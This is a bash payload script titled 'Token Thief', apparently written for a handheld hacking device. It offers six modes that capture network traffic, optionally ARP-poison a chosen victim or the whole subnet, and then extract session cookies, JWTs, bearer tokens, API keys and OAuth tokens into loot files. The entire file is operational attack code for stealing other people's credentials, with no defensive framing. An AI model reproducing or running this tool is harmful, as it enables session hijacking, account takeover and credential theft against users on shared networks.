#!/bin/bash
# Title: Token Thief
# Author: bad-antics
# Description: Session token interception, extraction and replay attack tool
# Category: nullsec/interception

LOOT_DIR="/mmc/nullsec/token-thief"
mkdir -p "$LOOT_DIR"

PROMPT "TOKEN THIEF

Session token interception
and replay attack framework.

Capabilities:
- Cookie/session hijacking
- JWT extraction & forging
- OAuth token theft
- API key harvesting
- Bearer token capture
- CSRF token extraction

Press OK to configure."

PROMPT "ATTACK MODE

1. Passive sniff (cookies)
2. ARP + cookie hijack
3. JWT extractor
4. API key harvester
5. OAuth interceptor
6. Full token sweep

Select on next screen."

MODE=$(NUMBER_PICKER "Mode (1-6):" 6)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac

INTERFACE=$(TEXT_PICKER "Interface:" "wlan0mon")

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
TOKEN_FILE="$LOOT_DIR/tokens_${TIMESTAMP}.txt"
JWT_FILE="$LOOT_DIR/jwt_${TIMESTAMP}.json"
COOKIE_FILE="$LOOT_DIR/cookies_${TIMESTAMP}.txt"
API_FILE="$LOOT_DIR/apikeys_${TIMESTAMP}.txt"

extract_cookies() {
    local pcap="$1"
    # Extract Set-Cookie and Cookie headers
    tshark -r "$pcap" -Y "http.cookie || http.set_cookie" \
        -T fields -e ip.src -e ip.dst -e http.host -e http.cookie -e http.set_cookie \
        2>/dev/null | while IFS=$'\t' read -r src dst host cookie setcookie; do
        [ -n "$cookie" ] && echo "[COOKIE] $src -> $host: $cookie" >> "$COOKIE_FILE"
        [ -n "$setcookie" ] && echo "[SET-COOKIE] $host -> $dst: $setcookie" >> "$COOKIE_FILE"
    done
    
    # Session IDs
    grep -oP '(PHPSESSID|JSESSIONID|ASP\.NET_SessionId|session_id|sid|token|auth|connect\.sid)=[^;&\s]+' \
        "$COOKIE_FILE" 2>/dev/null | sort -u >> "$TOKEN_FILE"
}

extract_jwt() {
    local pcap="$1"
    # JWT pattern: base64.base64.base64
    tshark -r "$pcap" -Y "http" -T fields -e http.authorization -e http.cookie \
        -e http.request.full_uri 2>/dev/null | \
    grep -oP 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' | \
    sort -u | while read -r jwt; do
        # Decode JWT
        HEADER=$(echo "$jwt" | cut -d. -f1 | base64 -d 2>/dev/null)
        PAYLOAD=$(echo "$jwt" | cut -d. -f2 | base64 -d 2>/dev/null)
        
        echo "{" >> "$JWT_FILE"
        echo "  \"raw\": \"$jwt\"," >> "$JWT_FILE"
        echo "  \"header\": $HEADER," >> "$JWT_FILE"
        echo "  \"payload\": $PAYLOAD," >> "$JWT_FILE"
        echo "  \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"" >> "$JWT_FILE"
        echo "}," >> "$JWT_FILE"
        
        # Check expiration
        EXP=$(echo "$PAYLOAD" | grep -oP '"exp":\s*\K\d+')
        NOW=$(date +%s)
        if [ -n "$EXP" ] && [ "$EXP" -gt "$NOW" ]; then
            REMAINING=$(( (EXP - NOW) / 60 ))
            echo "[JWT VALID] Expires in ${REMAINING}m: ${jwt:0:50}..." >> "$TOKEN_FILE"
        else
            echo "[JWT EXPIRED] ${jwt:0:50}..." >> "$TOKEN_FILE"
        fi
    done
}

extract_apikeys() {
    local pcap="$1"
    # API keys in headers and URLs
    tshark -r "$pcap" -Y "http" -T fields \
        -e http.request.full_uri -e http.authorization \
        -e http.request.line 2>/dev/null | \
    grep -oiP '(api[_-]?key|apikey|api[_-]?token|access[_-]?token|x-api-key|authorization)[=:]\s*[A-Za-z0-9_\-\.]{20,}' | \
    sort -u >> "$API_FILE"
    
    # Bearer tokens
    tshark -r "$pcap" -Y "http.authorization contains \"Bearer\"" \
        -T fields -e ip.src -e http.host -e http.authorization 2>/dev/null | \
    while IFS=$'\t' read -r src host auth; do
        echo "[BEARER] $src -> $host: $auth" >> "$TOKEN_FILE"
    done
}

extract_oauth() {
    local pcap="$1"
    # OAuth flows
    tshark -r "$pcap" -Y "http" -T fields -e http.request.full_uri 2>/dev/null | \
    grep -oP '(access_token|code|refresh_token|id_token)=[^&\s]+' | \
    sort -u | while read -r token; do
        echo "[OAUTH] $token" >> "$TOKEN_FILE"
    done
    
    # OAuth in response bodies
    tshark -r "$pcap" -Y "http.response && http.content_type contains \"json\"" \
        -T fields -e http.file_data 2>/dev/null | \
    grep -oP '"(access_token|refresh_token|id_token)"\s*:\s*"[^"]+"' | \
    sort -u >> "$TOKEN_FILE"
}

DURATION=$(NUMBER_PICKER "Capture duration (min):" 5)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=5 ;; esac

resp=$(CONFIRMATION_DIALOG "LAUNCH TOKEN THIEF?

Interface: $INTERFACE
Mode: $MODE
Duration: ${DURATION}m

This will capture network
tokens and session data.

Press OK to start.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "TokenThief: mode=$MODE iface=$INTERFACE dur=${DURATION}m"
PCAP="/tmp/tokencap_${TIMESTAMP}.pcap"

case $MODE in
    1) # Passive cookie sniff
        SPINNER_START "Passive token capture..."
        timeout $((DURATION * 60)) tcpdump -i "$INTERFACE" -w "$PCAP" \
            'tcp port 80 or tcp port 443 or tcp port 8080' 2>/dev/null
        SPINNER_STOP
        
        SPINNER_START "Extracting cookies..."
        extract_cookies "$PCAP"
        SPINNER_STOP
        ;;
        
    2) # ARP + cookie hijack
        GATEWAY=$(ip route | grep default | awk '{print $3}')
        VICTIM=$(TEXT_PICKER "Victim IP (or * for all):" "*")
        
        SPINNER_START "ARP poisoning + capture..."
        if [ "$VICTIM" = "*" ]; then
            # Subnet-wide
            arpspoof -i "$INTERFACE" -t "$GATEWAY" &>/dev/null &
            ARP_PID=$!
        else
            arpspoof -i "$INTERFACE" -t "$VICTIM" "$GATEWAY" &>/dev/null &
            ARP_PID=$!
            arpspoof -i "$INTERFACE" -t "$GATEWAY" "$VICTIM" &>/dev/null &
        fi
        
        echo 1 > /proc/sys/net/ipv4/ip_forward
        timeout $((DURATION * 60)) tcpdump -i "$INTERFACE" -w "$PCAP" 'tcp port 80 or tcp port 443' 2>/dev/null
        
        kill $ARP_PID 2>/dev/null
        wait 2>/dev/null
        echo 0 > /proc/sys/net/ipv4/ip_forward
        SPINNER_STOP
        
        SPINNER_START "Extracting tokens..."
        extract_cookies "$PCAP"
        extract_jwt "$PCAP"
        SPINNER_STOP
        ;;
        
    3) # JWT extractor
        SPINNER_START "Hunting JWTs..."
        timeout $((DURATION * 60)) tcpdump -i "$INTERFACE" -w "$PCAP" \
            'tcp port 80 or tcp port 443 or tcp port 8080 or tcp port 3000' 2>/dev/null
        SPINNER_STOP
        
        SPINNER_START "Decoding JWTs..."
        extract_jwt "$PCAP"
        SPINNER_STOP
        ;;
        
    4) # API key harvester
        SPINNER_START "Harvesting API keys..."
        timeout $((DURATION * 60)) tcpdump -i "$INTERFACE" -w "$PCAP" \
            'tcp port 80 or tcp port 443 or tcp port 8080 or tcp port 3000 or tcp port 5000' 2>/dev/null
        SPINNER_STOP
        
        SPINNER_START "Extracting keys..."
        extract_apikeys "$PCAP"
        SPINNER_STOP
        ;;
        
    5) # OAuth interceptor
        SPINNER_START "OAuth token interception..."
        timeout $((DURATION * 60)) tcpdump -i "$INTERFACE" -w "$PCAP" \
            'tcp port 80 or tcp port 443' 2>/dev/null
        SPINNER_STOP
        
        SPINNER_START "Extracting OAuth tokens..."
        extract_oauth "$PCAP"
        SPINNER_STOP
        ;;
        
    6) # Full sweep
        GATEWAY=$(ip route | grep default | awk '{print $3}')
        
        SPINNER_START "Full token sweep..."
        echo 1 > /proc/sys/net/ipv4/ip_forward
        arpspoof -i "$INTERFACE" -t "$GATEWAY" &>/dev/null &
        ARP_PID=$!
        
        timeout $((DURATION * 60)) tcpdump -i "$INTERFACE" -w "$PCAP" \
            'tcp port 80 or tcp port 443 or tcp port 8080 or tcp port 3000 or tcp port 5000' 2>/dev/null
        
        kill $ARP_PID 2>/dev/null
        wait 2>/dev/null
        echo 0 > /proc/sys/net/ipv4/ip_forward
        SPINNER_STOP
        
        SPINNER_START "Extracting all tokens..."
        extract_cookies "$PCAP"
        extract_jwt "$PCAP"
        extract_apikeys "$PCAP"
        extract_oauth "$PCAP"
        SPINNER_STOP
        ;;
esac

rm -f "$PCAP" 2>/dev/null

# Count findings
TOKENS=$(wc -l < "$TOKEN_FILE" 2>/dev/null || echo 0)
COOKIES=$(wc -l < "$COOKIE_FILE" 2>/dev/null || echo 0)
JWTS=$(grep -c "raw" "$JWT_FILE" 2>/dev/null || echo 0)
APIS=$(wc -l < "$API_FILE" 2>/dev/null || echo 0)
TOTAL=$((TOKENS + COOKIES + JWTS + APIS))

if [ "$TOTAL" -gt 0 ]; then
    SUMMARY=""
    [ "$COOKIES" -gt 0 ] && SUMMARY="${SUMMARY}Cookies: $COOKIES\n"
    [ "$JWTS" -gt 0 ] && SUMMARY="${SUMMARY}JWTs: $JWTS\n"
    [ "$APIS" -gt 0 ] && SUMMARY="${SUMMARY}API Keys: $APIS\n"
    [ "$TOKENS" -gt 0 ] && SUMMARY="${SUMMARY}Tokens: $TOKENS\n"
    
    PROMPT "TOKENS CAPTURED!

$(echo -e "$SUMMARY")
Total artifacts: $TOTAL

Saved to token-thief/

Press OK to exit."
    NOTIFICATION "TokenThief: $TOTAL tokens captured"
else
    PROMPT "NO TOKENS

No session tokens captured
in ${DURATION}m of monitoring.

Try:
- Longer duration
- ARP poison mode
- Different interface

Press OK to exit."
fi
